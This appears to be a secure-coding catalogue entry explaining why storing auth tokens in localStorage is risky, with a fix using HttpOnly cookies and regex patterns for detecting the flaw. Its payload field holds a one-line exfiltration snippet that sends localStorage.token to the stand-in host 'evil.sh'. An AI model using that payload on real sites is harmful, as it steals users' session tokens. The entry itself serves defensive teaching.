---
order: 1
cwe: 922
owasp: A01
title: Tokens in localStorage
category: secrets
severity: high
sink: |-
    localStorage.setItem("token", jwt)
payload: |-
    new Image().src = "//evil.sh?t=" + localStorage.token
fix: |
    Set-Cookie: session=…; HttpOnly; Secure; SameSite=Lax
detect:
    - '(localStorage|sessionStorage)\.setItem\(["''](token|jwt|auth|access)'
    - 'localStorage\.(token|jwt|accessToken)'
verify: "Read `localStorage` in the console; any token there is readable by every script on the page."
fineWhen: "The value is not a credential, or it is a short-lived token bound to the device (DPoP) with the refresh token in an `HttpOnly` cookie."
refs:
    - https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage
---

One XSS or one bad dependency, and I leave with your token to use from my own machine. An `HttpOnly` cookie I can't read — I can only act while your tab is open.
